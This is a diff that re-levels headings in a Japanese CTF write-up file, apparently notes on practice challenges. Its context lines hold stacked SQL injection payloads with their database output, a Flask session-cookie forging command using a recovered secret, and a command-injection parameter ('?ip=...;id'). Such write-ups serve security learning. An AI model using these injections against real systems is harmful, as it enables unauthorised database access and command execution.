@@ -152,22 +152,22 @@ array(1) {
 }
 ```
 
-## [SUCTF 2019]EasySQL
+# [SUCTF 2019]EasySQL
 
 数字をいれると、Arrayが返ってくる。
 1,2,3,4,5,みたいな感じしか1以外の入力を受け付けてない。
 1,23,4,1みたいに最後の数字は1になる。
 文字列もダメなど、WAFに弾かれていることがわかる。
 
-### 1;show databases;#
+## 1;show databases;#
 
 ```php
 Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )
 ```
 
-### 1;show tables;#
+## 1;show tables;#
 
-### 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1
+## 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1
 sql_modeを利用してCONCATとしてパイプを利用する。
 
 また、
@@ -380,7 +380,7 @@ $ python3 flask_session_cookie_manager3.py encode -s 'ckj123' -t '{"name":"admin
 <h1 class="nav">flag{92615bb9-8e91-43cc-8f12-f8543bd02ded}</h1>
 ```
 
-## [GXYCTF2019]Ping Ping Ping
+# [GXYCTF2019]Ping Ping Ping
 
 ?ip=192.168.2.100;id
 
